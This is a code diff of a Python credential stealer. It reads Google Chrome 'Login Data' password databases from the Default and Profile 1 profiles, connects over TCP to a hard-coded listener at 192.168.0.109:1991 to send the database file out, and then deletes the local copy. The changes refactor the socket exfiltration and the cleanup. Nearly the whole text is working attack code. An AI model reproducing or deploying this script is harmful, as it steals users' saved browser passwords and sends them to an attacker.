@@ -10,8 +10,8 @@ import sqlite3
 import win32crypt
 import socket
 
-host = '192.168.0.104'
-port = 1991
+HOST = '192.168.0.109'
+PORT = 1991
 
 default_user = r'\..\Local\Google\Chrome\User Data\Default\Login Data'
 profile1_user = r'\..\Local\Google\Chrome\User Data\Profile 1\Login Data'
@@ -48,36 +48,24 @@ finally:
     conn2.close()
 
 # Connect LHOST and send login_data
-try:
-    clientsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    clientsock.connect((host, port))
+with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+    s.connect((HOST, PORT))
+
     binary_data = None
     with open(passfilename, 'rb') as passfile:
         binary_data = passfile.read()
     if binary_data:
-        clientsock.sendall(binary_data)
+        s.sendall(binary_data)
+        data = s.recv(1024)
+        print('Received', repr(data))
 
-    # # Test local
+    # Test local
     # if binary_data:
     #     with open("abc.db", 'wb') as abc:
     #         abc.write(binary_data)
 
+# Remove db
+try:
+    remove(passfilename)
 except Exception as e:
     print(e)
-finally:
-    # shutdown connection
-    if clientsock:
-        try:
-            # Must sleep for 1 seconds => shutdown too fast will make data not
-            # readable
-            import time
-            time.sleep(10)
-            clientsock.shutdown(socket.SHUT_WR)
-            clientsock.close()
-        except Exception as e:
-            print(e)
-    # Remove db
-    try:
-        remove(passfilename)
-    except Exception as e:
-        print(e)
